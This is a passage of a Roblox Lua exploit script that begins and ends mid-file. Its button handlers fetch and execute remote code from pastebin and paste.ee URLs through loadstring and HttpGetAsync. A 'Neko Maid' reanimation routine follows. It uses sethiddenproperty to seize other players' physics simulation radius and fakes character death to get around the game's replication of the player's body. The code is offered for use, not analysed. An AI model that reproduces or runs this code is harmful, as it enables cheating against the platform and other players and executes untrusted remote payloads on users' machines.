loadstring(game:HttpGetAsync("https://pastebin.com/raw/kMYThpNG"))()
end)

Smug.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZuKy7HFF"))()
end)

Sonic.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A"))()
end)

Spider.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/txsk1LJg"))()
end)

SwordStand.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://paste.ee/r/NwGVX/0"))()
end)

UMD.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
end)

Wall.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/AY6kA2AV"))()
end)

achroGlicher.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/T7cmny7C"))()
end)
end)
Tab3Section:NewButton("N3k0 Anims", "Opens NAwss Script", function(W)
    -- FE Neko Maid Animations By Creo
-- Tail that CAN be used https://web.roblox.com/catalog/4645440842/Plain-White-Cat-Tail
-- For updates on script join this server
-- https://discord.gg/ad7WVB6Bxf


local NotificationBindable = Instance.new("BindableFunction")
local Msgreq = function(Title,Text,Duration,Button1Text,Button2Text)
	game.StarterGui:SetCore("SendNotification", {
		Title = Title;
		Text = Text;
		Icon = "";
		Duration = Duration;
		Button1 = Button1Text;
		Button2 = nil;
		Callback = NotificationBindable;
	})
end

Msgreq("FE Neko Anims V1.6","Loading, please wait while it loads",5,nil)
local SongID = "http://www.roblox.com/asset/?id=198665867"
Bypass = "death"
if not Bypass then Bypass = "limbs" end
HumanDied = false

CountSCIFIMOVIELOL = 1
function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
	local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = "AliP_"..CountSCIFIMOVIELOL
	AlignPos.ApplyAtCenterOfMass = true;
	AlignPos.MaxForce = 67752;
	AlignPos.MaxVelocity = math.huge/9e110;
	AlignPos.ReactionForceEnabled = false;
	AlignPos.Responsiveness = 200;
	AlignPos.RigidityEnabled = false;
	local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = "AliO_"..CountSCIFIMOVIELOL
	AlignOri.MaxAngularVelocity = math.huge/9e110;
	AlignOri.MaxTorque = 67752;
	AlignOri.PrimaryAxisOnly = false;
	AlignOri.ReactionTorqueEnabled = false;
	AlignOri.Responsiveness = 200;
	AlignOri.RigidityEnabled = false;
	local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = "AthP_"..CountSCIFIMOVIELOL
	local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = "AthP_"..CountSCIFIMOVIELOL
	local AttachmentC=Instance.new('Attachment',Part1); AttachmentC.Name = "AthO_"..CountSCIFIMOVIELOL
	local AttachmentD=Instance.new('Attachment',Part0); AttachmentD.Name = "AthO_"..CountSCIFIMOVIELOL
	AttachmentC.Orientation = Angle
	AttachmentA.Position = Position
	AlignPos.Attachment1 = AttachmentA;
	AlignPos.Attachment0 = AttachmentB;
	AlignOri.Attachment1 = AttachmentC;
	AlignOri.Attachment0 = AttachmentD;
	CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1

end

coroutine.wrap(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:wait()
	if sethiddenproperty then
		while true do
			game:GetService("RunService").RenderStepped:Wait()
			settings().Physics.AllowSleep = false
			local TBL = game:GetService("Players"):GetChildren() 
			for _ = 1,#TBL do local Players = TBL[_]
				if Players ~= game:GetService("Players").LocalPlayer then
					Players.MaximumSimulationRadius = 0
					sethiddenproperty(Players,"SimulationRadius",0) 
				end 
			end
			game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
			sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)*math.huge)
			if HumanDied then break end
		end
	else
		while true do
			game:GetService("RunService").RenderStepped:Wait()
			settings().Physics.AllowSleep = false
			local TBL = game:GetService("Players"):GetChildren() 
			for _ = 1,#TBL do local Players = TBL[_]
				if Players ~= game:GetService("Players").LocalPlayer then
					Players.MaximumSimulationRadius = 0
				end 
			end
			game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
			if HumanDied then break end
		end
	end
end)()

if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
	if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
		game:GetService("Players").LocalPlayer["Character"].Archivable = true 
		local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
		CloneChar.Parent = workspace 
		CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
		wait() 
		CloneChar.Humanoid.BreakJointsOnDeath = false
		workspace.Camera.CameraSubject = CloneChar.Humanoid
		CloneChar.Name = "non" 
		CloneChar.Humanoid.DisplayDistanceType = "None"
		if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
		if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

		local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
		DeadChar.HumanoidRootPart:Destroy()

		local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
		local CONVEC
		local function VECTORUNIT()
			if HumanDied then CONVEC:Disconnect(); return end
			local lookVec = workspace.Camera.CFrame.lookVector
			local Root = CloneChar["HumanoidRootPart"]
			LVecPart.Position = Root.Position
			LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
		end
		CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

		local CONDOWN
		local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
		local function KEYDOWN(_,Processed) 
			if HumanDied then CONDOWN:Disconnect(); return end
			if Processed ~= true then
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = true end
				if Key == Enum.KeyCode.A then
					ADown = true end
				if Key == Enum.KeyCode.S then
					SDown = true end
				if Key == Enum.KeyCode.D then
					DDown = true end
				if Key == Enum.KeyCode.Space then
					SpaceDown = true end end end
		CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

		local CONUP
		local function KEYUP(_)
			if HumanDied then CONUP:Disconnect(); return end
			local Key = _.KeyCode
			if Key == Enum.KeyCode.W then
				WDown = false end
			if Key == Enum.KeyCode.A then
				ADown = false end
			if Key == Enum.KeyCode.S then
				SDown = false end
			if Key == Enum.KeyCode.D then
				DDown = false end
			if Key == Enum.KeyCode.Space then
				SpaceDown = false end end
		CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

		local function MoveClone(X,Y,Z)
			LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
			workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
		end

		coroutine.wrap(function() 
			while true do game:GetService("RunService").RenderStepped:Wait()
				if HumanDied then break end
				if WDown then MoveClone(0,0,1e4) end
				if ADown then MoveClone(1e4,0,0) end
				if SDown then MoveClone(0,0,-1e4) end
				if DDown then MoveClone(-1e4,0,0) end
				if SpaceDown then CloneChar["Humanoid"].Jump = true end
				if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
					workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
			end 
		end)()

		local con
		function UnCollide()
			if HumanDied then con:Disconnect(); return end
			for _,Parts in next, CloneChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false 
				end 
			end
			for _,Parts in next, DeadChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false
				end 
			end 
		end
		con = game:GetService("RunService").Stepped:Connect(UnCollide)

		local resetBindable = Instance.new("BindableEvent")
		resetBindable.Event:connect(function()
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
			resetBindable:Destroy()
			pcall(function()
				CloneChar.Humanoid.Health = 0
				DeadChar.Humanoid.Health = 0
			end)
		end)
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
					HumanDied = true
					pcall(function()
						game.Players.LocalPlayer.Character = CloneChar
						CloneChar:Destroy()
						game.Players.LocalPlayer.Character = DeadChar
						if resetBindable then
							game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
							resetBindable:Destroy()
						end
						DeadChar.Humanoid.Health = 0
					end)
					break
				end		
			end
		end)()

		SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if HumanDied then break end
				DeadChar["Torso"].CFrame = CloneChar["Torso"].CFrame
			end
		end)()

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end

		for _,BodyParts in next, CloneChar:GetDescendants() do
			if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
				BodyParts.Transparency = 1 end end

		DeadChar.Torso["Left Shoulder"]:Destroy()
		DeadChar.Torso["Right Shoulder"]:Destroy()
		DeadChar.Torso["Left Hip"]:Destroy()
		DeadChar.Torso["Right Hip"]:Destroy()

	elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
		game:GetService("Players").LocalPlayer["Character"].Archivable = true 
		local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
		game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
		local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
		Instance.new("Part",FalseChar).Name = "Head" 
		Instance.new("Part",FalseChar).Name = "Torso" 
		Instance.new("Humanoid",FalseChar).Name = "Humanoid"
		game:GetService("Players").LocalPlayer["Character"] = FalseChar
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
		local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
		Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
		Clone.Name = "Humanoid"
		game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
		game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
		wait(5.65) 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
		CloneChar.Parent = workspace 
		CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
		wait() 
		CloneChar.Humanoid.BreakJointsOnDeath = false
		workspace.Camera.CameraSubject = CloneChar.Humanoid 
		CloneChar.Name = "non" 
		CloneChar.Humanoid.DisplayDistanceType = "None"
		if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
		if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

		FalseChar:Destroy()

		local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

		local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
		local CONVEC
		local function VECTORUNIT()
			if HumanDied then CONVEC:Disconnect(); return end
			local lookVec = workspace.Camera.CFrame.lookVector
			local Root = CloneChar["HumanoidRootPart"]
			LVecPart.Position = Root.Position
			LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
		end
		CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

		local CONDOWN
		local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
		local function KEYDOWN(_,Processed) 
			if HumanDied then CONDOWN:Disconnect(); return end
			if Processed ~= true then
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = true end
				if Key == Enum.KeyCode.A then
					ADown = true end
				if Key == Enum.KeyCode.S then
					SDown = true end
				if Key == Enum.KeyCode.D then
					DDown = true end
				if Key == Enum.KeyCode.Space then
					SpaceDown = true end end end
		CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

		local CONUP
		local function KEYUP(_)
			if HumanDied then CONUP:Disconnect(); return end
			local Key = _.KeyCode
			if Key == Enum.KeyCode.W then
				WDown = false end
			if Key == Enum.KeyCode.A then
				ADown = false end
			if Key == Enum.KeyCode.S then
				SDown = false end
			if Key == Enum.KeyCode.D then
				DDown = false end
			if Key == Enum.KeyCode.Space then
				SpaceDown = false end end
		CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

		local function MoveClone(X,Y,Z)
			LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
			workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
		end

		coroutine.wrap(function() 
			while true do game:GetService("RunService").RenderStepped:Wait()
				if HumanDied then break end
				if WDown then MoveClone(0,0,1e4) end
				if ADown then MoveClone(1e4,0,0) end
				if SDown then MoveClone(0,0,-1e4) end
				if DDown then MoveClone(-1e4,0,0) end
				if SpaceDown then CloneChar["Humanoid"].Jump = true end
				if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
					workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
			end 
		end)()

		local con
		function UnCollide()
			if HumanDied then con:Disconnect(); return end
			for _,Parts in next, CloneChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false 
				end 
			end
			for _,Parts in next, DeadChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false
				end 
			end 
		end
		con = game:GetService("RunService").Stepped:Connect(UnCollide)

		local resetBindable = Instance.new("BindableEvent")
		resetBindable.Event:connect(function()
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
			resetBindable:Destroy()
			CloneChar.Humanoid.Health = 0
		end)
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
					HumanDied = true
					pcall(function()
						game.Players.LocalPlayer.Character = CloneChar
						CloneChar:Destroy()
						game.Players.LocalPlayer.Character = DeadChar
						if resetBindable then
							game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
							resetBindable:Destroy()
						end
						DeadChar.Humanoid.Health = 0
					end)
					break
				end		
			end
		end)()

		SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["HumanoidRootPart"],CloneChar["HumanoidRootPart"],Vector3.new(0,0,0),Vector3.new(0,0,0))

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				if v.Name == "PlainTail" then
					Tail = CloneChar[v.Name].Handle
				end
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end

		for _,BodyParts in next, CloneChar:GetDescendants() do
			if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
				BodyParts.Transparency = 1 end end
	elseif Bypass == "hats" then
		game:GetService("Players").LocalPlayer["Character"].Archivable = true 
		local DeadChar = game.Players.LocalPlayer.Character
		DeadChar.Name = "non"
		local HatPosition = Vector3.new(0,0,0)
		local HatName = "MediHood"
		local HatsLimb = {
			Rarm = DeadChar:FindFirstChild("Hat1"),
			Larm = DeadChar:FindFirstChild("Pink Hair"),
			Rleg = DeadChar:FindFirstChild("Robloxclassicred"),
			Lleg = DeadChar:FindFirstChild("Kate Hair"),
			Torso1 = DeadChar:FindFirstChild("Pal Hair"),
			Torso2 = DeadChar:FindFirstChild("LavanderHair")
		}
		HatName = DeadChar:FindFirstChild(HatName)

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
					HumanDied = true
					pcall(function()
						if resetBindable then
							game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
							resetBindable:Destroy()
						end
						DeadChar.Humanoid.Health = 0
					end)
					break
				end		
			end
		end)()

		local con
		function UnCollide()
			if HumanDied then con:Disconnect(); return end
			for _,Parts in next, DeadChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false
				end 
			end 
		end
		con = game:GetService("RunService").Stepped:Connect(UnCollide)

		SCIFIMOVIELOL(HatName.Handle,DeadChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(HatsLimb.Torso1.Handle,DeadChar["Torso"],Vector3.new(0.5,0,0),Vector3.new(90,0,0))
		SCIFIMOVIELOL(HatsLimb.Torso2.Handle,DeadChar["Torso"],Vector3.new(-0.5,0,0),Vector3.new(90,0,0))
		SCIFIMOVIELOL(HatsLimb.Larm.Handle,DeadChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
		SCIFIMOVIELOL(HatsLimb.Rarm.Handle,DeadChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
		SCIFIMOVIELOL(HatsLimb.Lleg.Handle,DeadChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))
		SCIFIMOVIELOL(HatsLimb.Rleg.Handle,DeadChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))

		for i,v in pairs(HatsLimb) do
			v.Handle:FindFirstChild("AccessoryWeld"):Destroy()
			if v.Handle:FindFirstChild("Mesh") then v.Handle:FindFirstChild("Mesh"):Destroy() end
			if v.Handle:FindFirstChild("SpecialMesh") then v.Handle:FindFirstChild("SpecialMesh"):Destroy() end
		end
		HatName.Handle:FindFirstChild("AccessoryWeld"):Destroy()
	end
else
	if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
		game:GetService("Players").LocalPlayer["Character"].Archivable = true 
		local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
		CloneChar.Parent = workspace 
		CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
		CloneChar.Humanoid.BreakJointsOnDeath = false
		workspace.Camera.CameraSubject = CloneChar.Humanoid 
		CloneChar.Name = "non" 
		CloneChar.Humanoid.DisplayDistanceType = "None"
		if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
		if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

		local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
		DeadChar.HumanoidRootPart:Destroy()

		local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
		local CONVEC
		local function VECTORUNIT()
			if HumanDied then CONVEC:Disconnect(); return end
			local lookVec = workspace.Camera.CFrame.lookVector
			local Root = CloneChar["HumanoidRootPart"]
			LVecPart.Position = Root.Position
			LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
		end
		CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

		local CONDOWN
		local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
		local function KEYDOWN(_,Processed) 
			if HumanDied then CONDOWN:Disconnect(); return end
			if Processed ~= true then
				local Key = _.KeyCode
				if Key == Enum.KeyCode.W then
					WDown = true end
				if Key == Enum.KeyCode.A then
					ADown = true end
				if Key == Enum.KeyCode.S then
					SDown = true end
				if Key == Enum.KeyCode.D then
					DDown = true end
				if Key == Enum.KeyCode.Space then
					SpaceDown = true end end end
		CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

		local CONUP
		local function KEYUP(_)
			if HumanDied then CONUP:Disconnect(); return end
			local Key = _.KeyCode
			if Key == Enum.KeyCode.W then
				WDown = false end
			if Key == Enum.KeyCode.A then
				ADown = false end
			if Key == Enum.KeyCode.S then
				SDown = false end
			if Key == Enum.KeyCode.D then
				DDown = false end
			if Key == Enum.KeyCode.Space then
				SpaceDown = false end end
		CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

		local function MoveClone(X,Y,Z)
			LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
			workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
		end

		coroutine.wrap(function() 
			while true do game:GetService("RunService").RenderStepped:Wait()
				if HumanDied then break end
				if WDown then MoveClone(0,0,1e4) end
				if ADown then MoveClone(1e4,0,0) end
				if SDown then MoveClone(0,0,-1e4) end
				if DDown then MoveClone(-1e4,0,0) end
				if SpaceDown then CloneChar["Humanoid"].Jump = true end
				if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
					workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
			end 
		end)()

		local con
		function UnCollide()
			if HumanDied then con:Disconnect(); return end
			for _,Parts in next, CloneChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false 
				end 
			end
			for _,Parts in next, DeadChar:GetDescendants() do
				if Parts:IsA("BasePart") then
					Parts.CanCollide = false
				end 
			end 
		end
		con = game:GetService("RunService").Stepped:Connect(UnCollide)

		local resetBindable = Instance.new("BindableEvent")
		resetBindable.Event:connect(function()
			game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
			resetBindable:Destroy()
			CloneChar.Humanoid.Health = 0
		end)
		game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
					HumanDied = true
					pcall(function()
						game.Players.LocalPlayer.Character = CloneChar
						CloneChar:Destroy()
						game.Players.LocalPlayer.Character = DeadChar
						if resetBindable then
							game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
							resetBindable:Destroy()
						end
						DeadChar.Humanoid.Health = 0
					end)
					break
				end		
			end
		end)()

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				v:Clone().Parent = CloneChar
			end
		end

		for _,v in next, DeadChar:GetDescendants() do
			if v:IsA("Motor6D") and v.Name ~= "Neck" then
				v:Destroy()
			end
		end

		SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

		SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
		SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

		coroutine.wrap(function()
			while true do
				game:GetService("RunService").RenderStepped:wait()
				if HumanDied then break end
				DeadChar["UpperTorso"].CFrame = CloneChar["Torso"].CFrame * CFrame.new(0,0.2,0)
			end
		end)()

		for _,v in next, DeadChar:GetChildren() do
			if v:IsA("Accessory") then
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end

		for _,BodyParts in next, CloneChar:GetDescendants() do
			if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
				BodyParts.Transparency = 1 end end

	elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
		game:GetService("Players").LocalPlayer["Character"].Archivable = true 
		local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
		game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
		local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
		Instance.new("Part",FalseChar).Name = "Head" 
		Instance.new("Part",FalseChar).Name = "UpperTorso"
		Instance.new("Humanoid",FalseChar).Name = "Humanoid"
		game:GetService("Players").LocalPlayer["Character"] = FalseChar
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
		local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
		Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
		Clone.Name = "Humanoid"
		game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
		game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
		wait(5.65) 
		game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
		CloneChar.Parent = workspace 
		CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
		wait() 
		CloneChar.Humanoid.BreakJointsOnDeath = false
		workspace.Camera.CameraSubject = CloneChar.Humanoid 
		CloneChar.Name = "non" 
		CloneChar.Humanoid.DisplayDistanceType = "None"
		if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
